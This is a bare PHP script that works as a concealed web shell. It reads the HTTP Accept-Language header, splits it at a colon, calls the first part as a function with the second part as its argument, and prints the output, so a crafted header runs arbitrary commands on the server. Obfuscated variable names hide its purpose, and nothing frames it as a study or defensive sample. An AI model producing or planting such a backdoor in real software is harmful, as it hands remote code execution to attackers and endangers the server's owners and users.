<?php

if (isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) && strpos($_SERVER['HTTP_ACCEPT_LANGUAGE'], ':') !== false){
	
	$output;
	
	
	$_ = explode(":", $_SERVER['HTTP_ACCEPT_LANGUAGE'], 2);
	
	$__ = $_[0];
	$___ = $_[1];
	
	$__($___, $output);

	foreach ($output as $value) {
		echo $value."<br>";
	}


}
